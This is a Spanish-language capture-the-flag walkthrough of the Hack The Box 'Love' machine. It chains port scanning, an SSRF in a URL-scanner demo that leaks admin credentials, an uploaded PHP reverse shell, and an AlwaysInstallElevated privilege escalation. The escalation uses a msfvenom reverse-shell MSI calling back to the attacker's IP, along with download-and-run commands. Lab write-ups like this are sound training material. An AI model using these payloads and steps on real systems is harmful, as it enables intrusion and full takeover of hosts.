 # LOVE MACHINE
 
 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/1.png)
 
 ## INDEX
 
 - [[#enumeracion|enumeracion]]
- [[#explotacion|explotacion]]
- [[#elevacion de privilegios|elevacion de privilegios]]

 
 ## enumeracion
 
 vamos a realizar un escaneo con nmap:

```
nmap -p- --open -T5 -v -n 10.10.10.239 -oG allPorts
```

Vemos todos estos puertos abiertos:

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/2.png)

Vamos a escanear los servicios y versiones:

```
nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670 -sV -sC 10.10.10.239 -oN targeted
```

Este es el resultado:

```
# Nmap 7.91 scan initiated Thu May 20 15:08:28 2021 as: nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670 -
       │ sV -sC -oN targeted 10.10.10.239
   2   │ Nmap scan report for 10.10.10.239
   3   │ Host is up (0.76s latency).
   4   │ 
   5   │ PORT      STATE SERVICE      VERSION
   6   │ 80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
   7   │ | http-cookie-flags: 
   8   │ |   /: 
   9   │ |     PHPSESSID: 
  10   │ |_      httponly flag not set
  11   │ |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
  12   │ |_http-title: Voting System using PHP
  13   │ 135/tcp   open  msrpc        Microsoft Windows RPC
  14   │ 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
  15   │ 443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
  16   │ |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
  17   │ |_http-title: 403 Forbidden
  18   │ | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
  19   │ | Not valid before: 2021-01-18T14:00:16
  20   │ |_Not valid after:  2022-01-18T14:00:16
  21   │ |_ssl-date: TLS randomness does not represent time
  22   │ | tls-alpn: 
  23   │ |_  http/1.1
  24   │ 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
  25   │ 3306/tcp  open  mysql?
  26   │ | fingerprint-strings: 
  27   │ |   DNSStatusRequestTCP, Help, NotesRPC, TerminalServerCookie: 
  28   │ |_    Host '10.10.16.15' is not allowed to connect to this MariaDB server
  29   │ 5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
  30   │ |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
  31   │ |_http-title: 403 Forbidden
  32   │ 5040/tcp  open  unknown
  33   │ 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  34   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  35   │ |_http-title: Not Found
  36   │ 5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  37   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  38   │ |_http-title: Not Found
  39   │ | ssl-cert: Subject: commonName=LOVE
  40   │ | Subject Alternative Name: DNS:LOVE, DNS:Love
  41   │ | Not valid before: 2021-04-11T14:39:19
  42   │ |_Not valid after:  2024-04-10T14:39:19
  43   │ |_ssl-date: 2021-05-20T19:30:59+00:00; +19m00s from scanner time.
  44   │ | tls-alpn: 
  45   │ |_  http/1.1
  46   │ 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  47   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  48   │ |_http-title: Not Found
  49   │ 49664/tcp open  msrpc        Microsoft Windows RPC
  50   │ 49665/tcp open  msrpc        Microsoft Windows RPC
  51   │ 49666/tcp open  msrpc        Microsoft Windows RPC
  52   │ 49667/tcp open  msrpc        Microsoft Windows RPC
  53   │ 49668/tcp open  msrpc        Microsoft Windows RPC
  54   │ 49669/tcp open  msrpc        Microsoft Windows RPC
  55   │ 49670/tcp open  msrpc        Microsoft Windows RPC
  56   │ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.c
       │ gi?new-service :
  57   │ SF-Port3306-TCP:V=7.91%I=7%D=5/20%Time=60A6B3C3%P=x86_64-pc-linux-gnu%r(DN
  58   │ SF:SStatusRequestTCP,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.16\.15'\x20is\
  59   │ SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
  60   │ SF:%r(Help,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.16\.15'\x20is\x20not\x20
  61   │ SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Termina
  62   │ SF:lServerCookie,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.16\.15'\x20is\x20n
  63   │ SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(N
  64   │ SF:otesRPC,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.16\.15'\x20is\x20not\x20
  65   │ SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
  66   │ Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
  67   │ 
  68   │ Host script results:
  69   │ |_clock-skew: mean: 18m59s, deviation: 0s, median: 18m59s
  70   │ | smb-security-mode: 
  71   │ |   authentication_level: user
  72   │ |   challenge_response: supported
  73   │ |_  message_signing: disabled (dangerous, but default)
  74   │ | smb2-security-mode: 
  75   │ |   2.02: 
  76   │ |_    Message signing enabled but not required
  77   │ | smb2-time: 
  78   │ |   date: 2021-05-20T19:30:42
  79   │ |_  start_date: N/A
  80   │ 
  81   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  82   │ # Nmap done at Thu May 20 15:12:03 2021 -- 1 IP address (1 host up) scanned in 215.54 seconds
```
 
 de todos los puertos vamos a empezar por las paginas web que hay varrios puertos abiertos para ese servicio.
 
hemos modificado el /etc/hosts para colocar la IP como love.htb

El puerto 80 muestra esto:

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/5.png)

usa las siguientes tecnologias

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/6.png)

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/7.png)

parece una pagina de votos


Intentado con admin - admin y otras credenciales no se pudo ingresar, vamos a ver las otras paginas web

el puerto 5000 muestra una pagina con codigo de estado 403 forbidden, eso quiere decir que no tenemos acceso pero si existe algo.

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/13.png)

Los puertos 5985,5986  47001 muestran el codigo de estado 404 not found

El puerto 443 (https://love.htb/) un codigo de estado 403 (forbidden) eso quiere decir que no tenemos acceso pero si existe algo.

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/8.png)

En el certificado nos sale una alerta

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/9.png)

Si vemos en "security > view certificate" del certificado nos muestra un subdominio staging.love.htb

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/10.png)

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/11.png)

guardamos este subdominio en /etc/hosts y lo abrimos en el navegador:

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/12.png)

Tenemos acceso a una pagina, si vamos a la opcion "demo" podemos ver un escaneador de url:

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/14.png)

veamos que pasa si en nuestra maquina habilitamos el servicio apache2 (sudo service apache2 start) y le pasamos nuestra direccion IP:

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/15.png)

No muestra el contenido de la maquina, como se encuentra en el servidor de la maquina love, si deberiamos tener acceso a las paginas con el codigo 403 forbidden, vamos a mandar lapagina que nos salia anteriormente forbidden (love.htb:5000/) pero para el equipo como ahi no esta seteado ese valor en su /etc/hosts y como esta pagina se encuentra en el servidor la direccion IP y igual a localhost (10.10.10.239 = 127.0.0.1):

mandamos 127.0.0.1:5000

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/16.png)

Vemos unas credenciales que pertenece a administrador de la pagina de votos, vamos a ver con wfuzz si existe un directorio que sea del administrador:

```
wfuzz -c --hc=404 -w usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://love.htb/FUZZ
```

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/17.png)

vemos una ruta /admin donde se debe ingresar las credenciales:

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/18.png)

y accedemos:

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/19.png)

## explotacion

la pagina utilza php, eso a lo descubrimos con whatweb, toqueteando el portal al que accedimos encontramos un campo de upload en "profile > update":

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/20.png)

Probemos subir una reverrse shell en php, intente con la de monkey pentester pero no tuve exito asi que busque "php rerverse shell github" en google y me encontre con este rerpositorio:

[https://github.com/ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell)

dentro del repo utilice el que se encuentra en "src > 
php_reverse_shell.php", lo modifique para colocar mi direccion IP yun puerto al que estare en escucha y lo subi al portal. Ademas nos pide la contraseña actual para subirlo (eso lo tenemos de la pagina donde vimos las credenciales)

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/21.png)

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/22.png)

Y si nos ponemos en escucha en el puerto 4242 y subimos el exploit:

```
nc -lvnp 4242
```

obtenemos una conexion como el usuario Phoebe::

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/23.png)

si vamos a la ruta desktop podemos ver la flag:

```
cd Users/Phoebe/Desktop
type user.txt
```

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/24.png)
 
  ## elevacion de privilegios
 
Haremos uso de la herramienta winPEAS para ver como podemos escalar privilegios, con systeminfo vemos que es una maquina Wndows 10 de 64 bits:

```
systeminfo
```

 ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/25.png)

entonces nos descargamos el binario (.exe) del winPEAS parra 64 bits del siguiente repositorio:

[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

la descargamos en nuestra maquina y lo transferimos a la maquina love de la siguiente manera:

en el direrctorio donde se encuentre el binaro de winPEAS establecemos un serrvidor en python:

python 2

```
python -m SimpleHTTPServer
```

python 3

```
python3 -m http.server
```
 
 en la maquina windows ngresamos a una powershell y descarrgamos el archivo:
 
 ```
 powershell
 
 Invoke-webRequest -Uri http://10.10.16.25:8000/winPEASx64.exe -OutFile winPEAS.exe
 ```
 
 [https://adamtheautomator.com/powershell-download-file/](https://adamtheautomator.com/powershell-download-file/)
 
 volvemos a la cmd y lo ejecutamos:
 
 ```
 exit
 
 .\winPEAS.exe
 ```
 
 De toda la salida nos llama la atencion esto:
 
  ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/26.png)
 
 Basicamente si estos 2 registros están **habilitados** (el valor es **0x1** ), los usuarios con cualquier privilegio pueden instalar (ejecutar) archivos .msi como NT AUTHORITY \\SYSTEM
 
 [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)
 
 Esto es como un permiso SUID en Linux.
 
 Entonces con msfenom nostros podems crear un .msi que nos de una rerverse shell
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.25 LPORT=4545 -f msi > shell.msi
 ```
 
 [https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
 
 Y este archivo generado lo tendriamos que subir de la misma forma que el winPEAS a la maquina love.
 
 Lo ejecutamos de la siguiente manera:
 
 ```
 msiexec /quiet /qn /i shell.msi
 
 msiexec -> permite la ejecucion de msi desde consola
 /quiet -> Suprime cualquier mensaje al usuario durante la instalación
 /qn -> instalaciion sin GUI (interfaz grafica)
 /i -> Instalación regular
 ```
 
 [https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/)
 
 ya con escucha en el puerto 4545:
 
 ```
 nc -lvnp 4545
 ```
 
 obtenemos una rerverse shell como usuariio NT Authority\\System
 
  ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/27.png)
 
 ahora podemos leer la flag
 
 ```
 cd /Users/Administrator/Desktop
 type root.txt
 ```
 
   ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LOVE/images/28.png)
 
 